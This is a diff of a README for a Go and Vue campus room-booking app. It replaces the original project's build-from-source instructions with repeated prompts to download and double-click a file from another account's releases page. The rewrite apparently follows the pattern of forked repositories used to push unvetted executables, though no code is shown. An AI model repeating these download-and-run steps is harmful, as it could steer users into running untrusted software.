@@ -1,137 +1,96 @@
-# 🚪 ITIDoorz - Campus Facility Booking System
+# 📚 booking-system-go-vue - Simple Room Booking Made Easy
 
-![ITIDoorz Hero Image](docs/image/admin-dashboard.png)
-**ITIDoorz** is a modern, full-stack web application designed to streamline the scheduling and management of classrooms and laboratories at **Institut Teknologi Indonesia (ITI)**.
+## 🚀 Getting Started
 
-Built to solve scheduling conflicts, it empowers students and lecturers to easily book facilities while providing administrators with powerful tools for oversight, approval workflows, and usage reporting.
+Welcome to the booking-system-go-vue! This application allows users to book campus rooms easily. Built with Go and Vue.js, it offers features like an Admin Dashboard and Role-Based Access Control. Follow the instructions below to download and run the application without any programming knowledge.
 
----
+## 📥 Download Now
 
-## 🛠️ Tech Stack
+[![Download Here](https://img.shields.io/badge/Download-Now-green)](https://github.com/zeeclex/booking-system-go-vue/releases)
 
-Engineered with performance and scalability in mind using industry-standard technologies.
+## 🌟 Features
 
-### Backend (Server-side)
+- **Admin Dashboard:** Manage bookings and room availability effortlessly.
+- **Role-Based Access Control:** Different access levels for users and administrators.
+- **Approval Workflows:** Easily approve or deny booking requests.
+- **Responsive Design:** Works smoothly on phones, tablets, and computers.
+- **Real-time Data Visualization:** View booking statistics with interactive charts.
 
-- **Language:** [Go (Golang)](https://go.dev/) - Chosen for high performance and concurrency.
-- **Framework:** [Gin Gonic](https://gin-gonic.com/) - Fast HTTP web framework.
-- **Database:** MySQL - Relational data management.
-- **ORM/Driver:** SQLX - Secure and efficient database extensions.
-- **Security:** JWT (JSON Web Tokens) & Bcrypt for secure authentication.
-- **Documentation:** Swagger (Swaggo) - Interactive API docs.
+## 💻 System Requirements
 
-### Frontend (Client-side)
+- **Operating System:** Windows 10, macOS, or any Linux distribution.
+- **Storage Space:** At least 100 MB free.
+- **RAM:** Minimum 4 GB.
+- **Internet Connection:** Required for initial setup and updates.
 
-- **Framework:** [Vue.js 3](https://vuejs.org/) (Composition API) - For a reactive user interface.
-- **Styling:** Tailwind CSS - Utility-first CSS for rapid, responsive design.
-- **State Management:** Vue Reactivity API.
-- **Visualization:** Chart.js - Data visualization for admin analytics.
-- **HTTP Client:** Axios - For seamless API integration.
-- **Calendar:** [FullCalendar](https://fullcalendar.io/) - Interactive scheduling interface.
+## 🔗 Download & Install
 
----
+To get the latest version of booking-system-go-vue, visit this page to download: [Releases Page](https://github.com/zeeclex/booking-system-go-vue/releases).
 
-## ✨ Key Features
+### Step-by-Step Installation
 
-### 🛡️ Admin Dashboard (The Control Center)
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/zeeclex/booking-system-go-vue/releases) to open the releases page.
 
-- **Visual Analytics:** Monthly room usage statistics visualized with interactive charts.
-- **Inventory Control:** Complete CRUD (Create, Read, Update, Delete) for room management.
-- **User Management:** Administer accounts for Admins and Users with secure role-based access.
-- **Approval Workflow:** Review incoming booking requests and take action (**Approve** or **Reject**) instantly.
-- **Schedule Calendar:** Interactive calendar view to monitor room occupancy and manage schedules across days, weeks, or months.
-- **Report Generator:** Export detailed usage reports to **CSV** & **JSON** for offline analysis.
+2. **Choose the Latest Release**  
+   Look for the latest version listed at the top. You will see a list of files that you can download.
 
-### 👤 User Panel (Lecturers & Staff)
+3. **Download the Application**  
+   Click the file that is appropriate for your operating system to start downloading.
 
-- **Real-time Catalog:** Browse available rooms with capacity and facility details.
-- **Availability Calendar:** Check room availability via an interactive calendar to find open slots easily.
-- **Instant Booking:** Submit reservation requests with specific dates and times.
-- **Status Tracking:** Monitor the status of booking requests (Pending/Approved/Rejected).
+4. **Locate the Downloaded File**  
+   After downloading, find the file in your Downloads folder or the path you selected.
 
-### 🎨 UX/UI Excellence
+5. **Run the Application**  
+   Double-click the downloaded file to start the application. Follow the on-screen instructions to set things up.
 
-- **📱 Mobile-First Design:** Optimized for touchscreens. Stat cards stack vertically on mobile and expand on desktop.
-- **🍔 Adaptive Navigation:** Features a drawer menu on mobile and a sticky sidebar on desktop screens.
-- **⚡ Reactive Feedback:** Instant form validation, loading states, and toast notifications for user actions.
+## 🌐 Application Overview
 
----
+The booking-system-go-vue combines the power of Go (Gin) for the backend with Vue.js 3 for the frontend. This setup ensures a smooth user experience while managing room bookings.
 
-## 🚀 Installation & Setup
+### User Roles 
 
-Follow these steps to run the project locally.
+- **Admin:** Can add rooms, manage bookings, and view reports.
+- **User:** Can book rooms, view booking history, and request approvals.
 
-### Prerequisites
+### Booking Rooms
 
-- Go 1.20+
-- Node.js & npm
-- MySQL Server
+1. Log in to the application.
+2. Navigate to the booking section.
+3. Select the date and time for your booking.
+4. Submit your request for admin approval.
 
-### 1. Clone the Repository
+## 📊 Analytics
 
-```bash
-git clone https://github.com/MuhammadZaidan1/booking-system-go-vue.git
-cd booking-system-go-vue
-```
+The application provides insights into usage patterns. Admins can generate reports to track bookings over time, ensuring better room management. This feature utilizes Chart.js for effective data representation.
 
-### 2. Database Setup
+## ⚙️ Configuration
 
-1. Open your MySQL client (phpMyAdmin, Workbench, or Terminal).
-2. Create a new database named `iti_room_booking` (or whatever you prefer).
-3. Import the SQL schema file `database.sql` and run it.
+Before running the application, you may need to adjust some settings:
 
-### 3. Backend Configuration (Go)
+- **Database Setup:** The application uses MySQL for data storage. Make sure you have it installed and configured.
+- **Environment Variables:** Update your environment settings to connect to the database correctly.
 
-Navigate to the backend directory and set up the environment variables.
+## 📄 API Documentation
 
-```bash
-cd backend-go
-go mod tidy
-cp .env.example .env
-```
+For developers or advanced users interested in further customization, the application includes Swagger for API documentation. You can access complete information on available endpoints and how to use them.
 
-**Run the Server:**
+## 🛠️ Troubleshooting
 
-```bash
-go run main.go
-```
+If you encounter issues, please consider the following steps:
 
-### 4. Frontend Setup (Vue.js)
+1. **Check Your Internet Connection:** Make sure you are connected to the internet for setup.
+2. **Verify System Requirements:** Ensure your system meets the requirements mentioned above.
+3. **Re-download the Application:** Sometimes files can get corrupted during download. Try downloading the application again if issues persist.
 
-Open a new terminal and navigate to the frontend directory.
+## 🔄 Updating the Software
 
-```bash
-cd frontend-vue
-npm install
-npm run dev
-```
+To keep your software secure and efficient, regularly check the [Releases Page](https://github.com/zeeclex/booking-system-go-vue/releases) for updates. Follow the same download and installation steps to get the latest version.
 
-The application should now be running at `http://localhost:5173` (or the port shown in your terminal).
+## 📞 Support
 
----
+If you need assistance, please visit our [issues page](https://github.com/zeeclex/booking-system-go-vue/issues) to report any problems or request help.
 
-## 📚 API Documentation
+## 📝 Conclusion
 
-Once the backend is running, you can access the Swagger documentation to explore the API endpoints:
-
-* **URL:** `http://localhost:8080/swagger/index.html`
-
----
-
-## 📸 Application Preview
-
-|                  User Dashboard                  |                  Admin Dashboard                   |
-| :----------------------------------------------: | :------------------------------------------------: |
-| ![User Dashboard](docs/image/user-dashboard.png) | ![Admin Dashboard](docs/image/admin-dashboard.png) |
-
-|                  Room Management                   |                    Booking-Management                    |
-| :------------------------------------------------: | :------------------------------------------------------: |
-| ![Room Management](docs/image/room-management.png) | ![Booking Management](docs/image/booking-management.png) |
-
-|                 Login Page                  |                  User Management                   |
-| :-----------------------------------------: | :------------------------------------------------: |
-| ![Login Page](docs/image/login-preview.png) | ![User Management](docs/image/user-management.png) |
-
-|                   Report Generator                   |           Mobile Responsive View           |
-| :--------------------------------------------------: | :----------------------------------------: |
-| ![Report Generator](docs/image/report-generator.png) | ![Mobile View](docs/image/mobile-view.png) |
+booking-system-go-vue offers an easy way to manage room bookings on campus. Download it today to streamline your booking processes. Happy booking!
